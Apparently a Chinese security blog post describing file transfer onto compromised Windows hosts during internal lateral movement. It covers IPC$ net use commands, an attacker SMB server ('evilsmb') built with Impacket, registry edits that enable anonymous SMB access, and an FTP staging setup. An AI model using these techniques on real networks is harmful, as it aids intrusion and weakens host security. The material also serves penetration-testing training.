<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Windows内网传输 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='攻防, 内网渗透' />
  <meta itemprop="name" content="windows内网传输">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="1310">
  <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/61/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="windows内网传输">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="攻防">
    <meta property="article:tag" content="内网渗透">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="windows内网传输">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/61/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/60/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/56/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "windows内网传输",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/61\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  1310 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/61\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ></a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Windows内网传输</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Windows内网传输</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1310 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#简介">简介</a></li>
        <li><a href="#条件">条件</a></li>
        <li><a href="#功能">功能</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li>
      <ul>
        <li><a href="#主要功能">主要功能</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#下载">下载</a></li>
    <li><a href="#上传">上传</a></li>
    <li><a href="#linux">linux</a>
      <ul>
        <li><a href="#安装">安装</a></li>
        <li><a href="#配置">配置</a></li>
        <li><a href="#创建用户">创建用户</a></li>
        <li><a href="#连接">连接</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#方法一">方法一</a></li>
    <li><a href="#方法二">方法二</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><blockquote>
<p>有时候我们拿到一个不能上传shell，但可以命令执行的windows服务器时，可以通过多种方法进行文件上传和下载。</p>
</blockquote>
<h1 id="ipc进程间通信" class="heading-element"><span>IPC(进程间通信)</span>
  <a href="#ipc%e8%bf%9b%e7%a8%8b%e9%97%b4%e9%80%9a%e4%bf%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h3 id="简介" class="heading-element"><span>简介</span>
  <a href="#%e7%ae%80%e4%bb%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>指至少两个进程或线程间传送数据或信号的一些技术或方法。</p>
<p>IPC$是共享“命名管道”的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问，从NT/2000开始使用。</p>
<p>IPC$在同一时间内，两个IP之间只允许建立一个连接。</p>
<h3 id="条件" class="heading-element"><span>条件</span>
  <a href="#%e6%9d%a1%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>远程主机开启ipc连接</li>
<li>139或445开放</li>
</ul>
<h3 id="功能" class="heading-element"><span>功能</span>
  <a href="#%e5%8a%9f%e8%83%bd" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><strong>IPC空连接</strong></p>
<p>对于NT，在默认安全设置下，借助空连接可以列举目标主机上的用户和共享，访问everyone权限的共享，访问小部分注册表等；在WIndows Server 2000及以后作用更小，因为在Windows 2000 和以后版本中默认只有管理员有权从网络访问到注册表。</p>
<p><strong>常用命令</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>建立IPC$空连接：net use <span style="color:#a6be9d">\1</span>92.168.1.101<span style="color:#a6be9d">\i</span>pc$ “” /user:”domain<span style="color:#a6be9d">\u</span>sername”
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>建立IPC$非空连接：net use <span style="color:#a6be9d">\1</span>92.168.1.101<span style="color:#a6be9d">\i</span>pc$ “password” /user:”domain<span style="color:#a6be9d">\u</span>sername”
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>删除IPC$连接：net use <span style="color:#a6be9d">\1</span>92.168.1.101<span style="color:#a6be9d">\i</span>pc$ /del
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>已经建立IPC$连接并且有权限，将目标C盘映射到本地Z盘：net use z: <span style="color:#a6be9d">\1</span>92.168.1.101<span style="color:#a6be9d">\c</span>$
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>删除映射：net use z: /del
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>关闭IPC默认共享：net use ipc$ /del
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>列出目录： dir <span style="color:#a6be9d">\\</span>ip<span style="color:#a6be9d">\C</span>$
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>文件传输： copy .<span style="color:#a6be9d">\1</span>.exe <span style="color:#a6be9d">\\</span>ip<span style="color:#a6be9d">\C</span>$</span></span></code></pre></div><p>注：</p>
<p>1.现在绝大多数的Windows操作系统默认策略不允许来自远程网络验证的空密码，所以IPC空连接已经被废弃。</p>
<p>2.如果远程服务端未开启139、445端口，无法使用IPC$进行连接。</p>
<h1 id="smb" class="heading-element"><span>SMB</span>
  <a href="#smb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p><a href="https://www.cnblogs.com/yuzly/p/10480438.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/yuzly/p/10480438.html</a></p>
<p>SMB(Server Message Block)被称为服务器消息块，又叫网络文件共享系统(CIFS)。在Windows2000中，SMB除了基于NBT实现，还可以直接通过445端口实现。</p>
<p>它运行在应用层，可以使用不同的传输层协议，如TCP（传输控制协议  445）或NetBIOS（网络基本输入/输出系统  139）来实际传输数据，目前倾向于使用445。</p>
<h3 id="主要功能" class="heading-element"><span>主要功能</span>
  <a href="#%e4%b8%bb%e8%a6%81%e5%8a%9f%e8%83%bd" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。</p>
<p>局域网共享文件夹：https://blog.csdn.net/qq_20191467/article/details/113032642</p>
<p>实战中黑客搭建一个可以被需要横向的主机访问的SMB服务器，linux可以用Impacket提供的smbserver.py来搭建SMB服务器</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>mkdir /root/share
</span></span><span style="display:flex;"><span>python smbserver.py evilsmb /root/share -amb2support</span></span></code></pre></div><p>对于windows，如==已获取管理员权限==，可以手动设置SMB匿名共享，也可以使用==Invoke-BuildAnonymousSMBServer==在本地快速启动一个匿名共享</p>
<p><a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p>
<p>支持域环境和工作组环境的Windows操作系统</p>
<p>需要本地管理员权限执行</p>
<p>开启可匿名访问的文件共享服务器：</p>
<pre tabindex="0"><code>.\Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Enable</code></pre><p>关闭可匿名访问的文件共享服务器：</p>
<pre tabindex="0"><code>.\Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Disable</code></pre><p>不行的话以管理员身份打开PowerShell 输入 <strong>set-executionpolicy remotesigned</strong>输入Y</p>
<p>或者是管理员权限运行以下脚本</p>
<pre tabindex="0"><code>// powershell版本过低的话会报错

mkdir C:\share
icacls C:\share\ /T /grant Anonymous` logon:r
icacls C:\share\ /T /grant Everyone:r
New-SmbShare -Path C:\share -Name share -ReadAccess &#39;ANONYMOUS LOGON&#39;,&#39;Everyone&#39;
REG ADD &#34;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&#34; /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
REG ADD &#34;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&#34; /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /v RestrictAnonymous /t REG_DWORD /d 0 /f
# Reboot</code></pre><h1 id="ftp" class="heading-element"><span>FTP</span>
  <a href="#ftp" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>FTP环境部署</p>
<p>首先，ftp支持ASCII码传输、也支持二进制传输，因此完全可以满足我们的上传下载需求。</p>
<p>我们可以在本地服务器先搭建一个ftp服务器，如3CDaemon:</p>
<blockquote>
<p>3CDaemon:</p>
<p>3CDaemon是一个网络工具软件，用于在计算机网络中进行文件传输和网络管理。它提供了多种功能，包括TFTP服务器、FTP服务器、Syslog服务器和TFTP客户端等。</p>
<p>TFTP服务器是3CDaemon的一个重要组成部分，它允许用户通过TFTP协议进行文件传输。TFTP（Trivial File Transfer Protocol）是一种简单的文件传输协议，通常用于在局域网中快速传输文件。使用3CDaemon的TFTP服务器，用户可以方便地上传和下载文件，例如固件升级、配置文件备份等。</p>
<p>此外，3CDaemon还提供了FTP服务器功能，允许用户通过FTP协议进行文件传输。FTP（File Transfer Protocol）是一种常用的文件传输协议，具有更多的功能和灵活性。通过3CDaemon的FTP服务器，用户可以创建虚拟文件夹、设置访问权限、管理用户账号等。</p>
<p>3CDaemon还包含一个Syslog服务器，用于接收和记录网络设备发送的Syslog消息。Syslog是一种用于系统日志记录和事件管理的协议，可以帮助管理员监控和分析网络设备的运行状态。</p>
<p>下载地址：https://www.updatestar.com/directdownload/3cdaemon/2005987</p>
</blockquote>
<p>管理员下运行一下安装程序，不过这玩意是windows的啊，我的云服务器是linux</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301409994.webp" alt="image-20230930140907803" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301409994.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301409994.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301409994.webp?size=large 2x" data-title="image-20230930140907803" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>然后安装完毕后，我们需要配置下FTPserver.</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301410272.webp" alt="image-20230930141057088" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301410272.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301410272.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301410272.webp?size=large 2x" data-title="image-20230930141057088" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>我们首先按提示指引，在FTP profiles下，开始配置FTP客户端的参数。</p>
<p>①：这里的用户名可以随便新建，以后在交换机登录到这个FTP客户端需要输入这个用户名</p>
<p>②：这里设置密码，以后在交换机登录到这个FTP客户端需要输入这个密码</p>
<p>③：这里是文件路径，也就是你要上传到交换机的文件的路径，这里示范的是我的桌面路径。</p>
<p>④：这里是这个用户所拥有的的权限，登录，下载，上传，删除等等</p>
<p>这里配置好之后就可以测试了~首先要说的是，我们要清楚这个软件的原理。这个软件安装以后其实就是吧我们的电脑变成了一个FTP服务器，然后不论是是交换机还是其他PC都可以通过ftp+ip address的方式来登录这台电脑，从而达到上传下载的目的。</p>
<h2 id="下载" class="heading-element"><span>下载</span>
  <a href="#%e4%b8%8b%e8%bd%bd" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>创建一个用户dongyu/123456：</p>
<p>靶机连接上ftp服务器之后，我们就可以进行上传、下载操作了。</p>
<p>ftp可以读取txt中的命令并执行，因此可以把需要执行的命令写入到一个txt文件中。</p>
<p>例如需要下载一个hello.txt到靶机中：</p>
<p>写入后，靶机中会生成一个ftp.txt文件：</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301427819.webp" alt="image-20230930142703718" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301427819.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301427819.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202309301427819.webp?size=large 2x" data-title="image-20230930142703718" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>通过命令行执行该文件</p>
